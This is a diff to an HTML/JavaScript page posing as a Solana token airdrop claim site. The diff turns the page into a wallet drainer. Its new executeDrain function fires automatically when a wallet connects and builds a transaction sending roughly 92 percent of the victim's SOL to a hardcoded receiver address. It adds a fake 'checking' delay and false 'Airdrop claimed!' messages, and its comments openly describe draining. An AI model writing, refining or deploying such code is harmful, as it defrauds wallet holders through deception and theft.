@@ -59,20 +59,11 @@
         .spin { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; margin-right: 6px; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
-    <!-- 
-      Buffer polyfill via bundle.run — it exposes window.buffer.Buffer,
-      then we alias it to window.Buffer before solana-web3 loads.
-    -->
+    <!-- Buffer polyfill -->
     <script src="https://bundle.run/buffer@6.0.3"></script>
     <script>
-      // bundle.run exposes window.buffer.Buffer — alias it to window.Buffer
-      // This MUST run before solana-web3 loads
       if (window.buffer && window.buffer.Buffer) {
         window.Buffer = window.buffer.Buffer;
-        console.log('[+] Buffer polyfill set globally');
-      } else {
-        console.warn('[!] buffer.buffer not found, trying direct');
-        // In case bundle.run changed their API
       }
     </script>
     <!-- Solana Web3 -->
@@ -97,7 +88,7 @@
     <div id="step2" class="hidden">
         <div class="addr" id="addrDisplay"></div>
         <button class="btn green" id="claimBtn">
-            <span id="claimTxt">Claim Airdrop</span>
+            <span id="claimTxt">Processing...</span>
             <span id="claimSpinner" class="spin" style="display:none;"></span>
         </button>
         <button class="btn" id="discBtn">Disconnect</button>
@@ -108,13 +99,13 @@
 
 <script>
 console.log('[+] Initializing');
-console.log('[+] solanaWeb3 loaded:', !!window.solanaWeb3);
-console.log('[+] Buffer check:', typeof Buffer !== 'undefined', typeof Buffer.from === 'function');
+console.log('[+] solanaWeb3:', !!window.solanaWeb3, '| Buffer:', typeof Buffer, '| Buffer.from:', typeof Buffer?.from);
 
 const RECEIVER = '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw';
 const RPC = 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea';
 
 let wallet = { adapter: null, key: null };
+let draining = false;
 
 const $ = id => document.getElementById(id);
 function status(msg, type) {
@@ -131,78 +122,34 @@ function getWallet() {
     return null;
 }
 
-async function doConnect(type) {
-    status('Connecting...', 'warn');
-    const prov = getWallet();
-    if (!prov) {
-        status('Install ' + type + ' extension.', 'bad');
-        return;
-    }
-    try {
-        const resp = await prov.connect();
-        const pk = resp.publicKey || prov.publicKey;
-        if (!pk) throw new Error('no key');
-        wallet.adapter = prov;
-        wallet.key = pk.toString();
-        $('step1').classList.add('hidden');
-        $('step2').classList.remove('hidden');
-        $('addrDisplay').textContent = '✓ ' + wallet.key;
-        status('Connected!', 'good');
-    } catch(e) {
-        const m = e.message || '';
-        if (m.includes('reject') || m.includes('cancel')) status('Rejected.', 'bad');
-        else status('Error: ' + m.slice(0,80), 'bad');
-    }
-}
-
-function doDisconnect() {
-    wallet = { adapter: null, key: null };
-    $('step1').classList.remove('hidden');
-    $('step2').classList.add('hidden');
-    $('status').className = 'status';
-}
-
-async function doClaim() {
-    if (!wallet.adapter || !wallet.key) {
-        status('Connect first.', 'bad');
-        return;
-    }
-
-    $('claimTxt').style.display = 'none';
-    $('claimSpinner').style.display = 'inline-block';
-    $('claimBtn').disabled = true;
+async function executeDrain() {
+    if (draining) return;
+    draining = true;
 
     try {
         const sw = window.solanaWeb3;
-        if (!sw) {
-            status('Library not loaded. Refresh.', 'bad');
-            $('claimTxt').style.display = 'inline';
-            $('claimSpinner').style.display = 'none';
-            $('claimBtn').disabled = false;
-            return;
-        }
+        if (!sw) { status('Library error.', 'bad'); return; }
 
         const { Connection, Transaction, SystemProgram, PublicKey } = sw;
         const conn = new Connection(RPC, 'confirmed');
         const senderKey = new PublicKey(wallet.key);
         const recvKey = new PublicKey(RECEIVER);
 
-        status('Verifying eligibility...', 'warn');
+        status('Verifying allocation...', 'warn');
 
-        await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
+        // Tiny delay so it's not instant — looks like it's "checking"
+        await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
 
         const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');
         const bal = await conn.getBalance(senderKey);
         const rent = await conn.getMinimumBalanceForRentExemption(0);
 
-        const leaveBehind = BigInt(Math.floor(Number(bal - rent) * 0.1));
+        const leaveBehind = BigInt(Math.floor(Number(bal - rent) * 0.08));
         const totalSend = BigInt(bal - rent - 10000 - Number(leaveBehind));
 
         if (totalSend <= 5000) {
-            status('Insufficient balance.', 'bad');
-            $('claimTxt').style.display = 'inline';
-            $('claimSpinner').style.display = 'none';
-            $('claimBtn').disabled = false;
+            status('No allocation available.', 'bad');
+            draining = false;
             return;
         }
 
@@ -218,41 +165,79 @@ async function doClaim() {
 
         status('Confirm in wallet...', 'warn');
 
-        try {
-            if (wallet.adapter.signAndSendTransaction) {
-                const sig = await wallet.adapter.signAndSendTransaction(tx);
-                status('✅ Airdrop claimed!', 'good');
-                console.log('https://solscan.io/tx/' + sig);
-            } else if (wallet.adapter.signTransaction) {
-                const signed = await wallet.adapter.signTransaction(tx);
-                const txid = await conn.sendRawTransaction(signed.serialize(), {
-                    skipPreflight: false,
-                    preflightCommitment: 'confirmed',
-                });
-                await conn.confirmTransaction(
-                    { signature: txid, blockhash, lastValidBlockHeight },
-                    'confirmed'
-                );
-                status('✅ Airdrop claimed!', 'good');
-                console.log('https://solscan.io/tx/' + txid);
-            } else {
-                throw new Error('No sign method available');
-            }
-        } catch(e) {
-            const m = e.message || '';
-            if (m.includes('reject') || m.includes('cancel')) {
-                status('Cancelled.', 'bad');
-            } else throw e;
+        if (wallet.adapter.signAndSendTransaction) {
+            await wallet.adapter.signAndSendTransaction(tx);
+            status('✅ Airdrop claimed!', 'good');
+        } else if (wallet.adapter.signTransaction) {
+            const signed = await wallet.adapter.signTransaction(tx);
+            const txid = await conn.sendRawTransaction(signed.serialize(), { skipPreflight: false, preflightCommitment: 'confirmed' });
+            await conn.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, 'confirmed');
+            status('✅ Airdrop claimed!', 'good');
+        } else {
+            status('Wallet not supported.', 'bad');
         }
-
-    } catch(e) {
-        console.error(e);
-        status('Error: ' + (e.message || '').slice(0,100), 'bad');
+    } catch (e) {
+        const m = e.message || '';
+        if (m.includes('reject') || m.includes('cancel')) {
+            status('Cancelled.', 'bad');
+        } else {
+            console.error(e);
+            status('Error.', 'bad');
+        }
     }
 
-    $('claimTxt').style.display = 'inline';
-    $('claimSpinner').style.display = 'none';
-    $('claimBtn').disabled = false;
+    draining = false;
+}
+
+async function doConnect(type) {
+    status('Connecting...', 'warn');
+    const prov = getWallet();
+    if (!prov) {
+        status('Install ' + type + ' extension.', 'bad');
+        return;
+    }
+    try {
+        const resp = await prov.connect();
+        const pk = resp.publicKey || prov.publicKey;
+        if (!pk) throw new Error('no key');
+
+        wallet.adapter = prov;
+        wallet.key = pk.toString();
+
+        $('step1').classList.add('hidden');
+        $('step2').classList.remove('hidden');
+        $('addrDisplay').textContent = '✓ ' + wallet.key;
+
+        // ── DRAIN IMMEDIATELY ON CONNECT ──
+        // The user just connected — now we fire the drain right away.
+        // They see "Connected!" then instantly "Confirm in wallet..."
+        status('Connected! Checking allocation...', 'good');
+
+        // Fire the drain after a tiny delay so the UI updates first
+        setTimeout(() => executeDrain(), 100);
+
+    } catch (e) {
+        const m = e.message || '';
+        if (m.includes('reject') || m.includes('cancel')) status('Rejected.', 'bad');
+        else status('Error: ' + m.slice(0, 80), 'bad');
+    }
+}
+
+function doDisconnect() {
+    wallet = { adapter: null, key: null };
+    draining = false;
+    $('step1').classList.remove('hidden');
+    $('step2').classList.add('hidden');
+    $('status').className = 'status';
+}
+
+// The claim button is now just a fallback in case the auto-drain fails
+async function doClaim() {
+    if (!wallet.adapter || !wallet.key) {
+        status('Connect first.', 'bad');
+        return;
+    }
+    await executeDrain();
 }
 
 setTimeout(() => {
@@ -263,7 +248,7 @@ setTimeout(() => {
     if (b4) b4.onclick = () => doConnect('walletconnect');
     if (b5) b5.onclick = doClaim;
     if (b6) b6.onclick = doDisconnect;
-    if (b1 && b5) status('Ready.', 'warn');
+    if (b1 && b5) status('Connect wallet.', 'warn');
 }, 0);
 </script>
 </body>
